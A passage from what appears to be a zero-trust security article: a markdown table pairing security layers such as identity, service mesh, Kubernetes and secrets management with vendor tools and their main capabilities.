|--------------|-------------------|-------------|---------------------------|
| **Identity & Access** | Okta, Auth0, Azure AD | Identity Provider | Continuous authentication, risk-based MFA |
| **Service Mesh** | Istio, Linkerd, Consul Connect | Service-to-service security | mTLS, fine-grained authorization |
| **Network Security** | Palo Alto Prisma, Zscaler | Network microsegmentation | Zero Trust Network Access (ZTNA) |
| **Kubernetes Security** | Falco, OPA Gatekeeper, Calico | Container platform security | Policy enforcement, runtime protection |
| **API Security** | Kong, Ambassador, Envoy | API gateway | Authentication, rate limiting, threat protection |
| **Monitoring** | Splunk, Elastic, Datadog | Security analytics | Behavioral analysis, threat detection |
| **Secrets Management** | HashiCorp Vault, AWS Secrets Manager | Credential protection | Dynamic secrets, short-lived tokens |
| **DevSecOps** | Snyk, Twistlock, Aqua | Supply chain security | Vulnerability scanning, compliance |

---

##
##
